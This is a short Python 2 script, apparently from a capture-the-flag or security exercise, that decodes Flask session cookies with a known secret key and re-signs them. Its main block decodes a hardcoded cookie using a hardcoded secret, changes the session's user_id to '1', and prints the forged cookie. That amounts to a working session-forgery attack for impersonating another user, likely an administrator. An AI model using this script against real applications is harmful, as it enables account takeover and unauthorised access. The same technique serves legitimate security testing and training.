#!/usr/bin/env python

# pip install -t .pip itsdangerous
# pip install -t .pip flask
# python cookie_decode.py

from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	# Override method
	# Take secret_key instead of an instance of a Flask app
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation=self.key_derivation,
			digest_method=self.digest_method
		)
		return URLSafeTimedSerializer(secret_key, salt=self.salt,
		                              serializer=self.serializer,
		                              signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.loads(cookieValue)

# Keep in mind that flask uses unicode strings for the
# dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.dumps(cookieDict)

if __name__=='__main__':
	'''
	sk = 'youWillNeverGuess'
	sessionDict = {u'Hello':'World'}
	cookie = encodeFlaskCookie(sk, sessionDict)
	decodedDict = decodeFlaskCookie(sk, cookie)
	assert sessionDict==decodedDict
	'''

	secret = "06f4eefabf03b8f4e521fbdada13f65c"
	cookie = ".eJwlj0uqAkEMAO_Saxf59sfLDJ10giIozOjq8e7ugAeoouqvbLnHcSvX9_6JS9nuq1xLADbBBENnH9knhCskVq9rkk90zCVVOonx9No8wHl00YEzOdRaLppd2LHORmM0VWcJNj0ZGsw1DcKSBpGedlzpTToAIpmXS_Fjz-39esTz7EFYvBgc2kI2mEk1u0llTO7iYdzVVtWT-xyx_yawl_8v6bc-7A.Dps6-Q.oEghMMu58NmwM1jJjHiEvQgH4UA"
	session = decodeFlaskCookie(secret, cookie)
	print 'Decoded cookie:', session

	session['user_id'] = u'1'
	cookie = encodeFlaskCookie(secret, session)
	print 'New cookie:', cookie



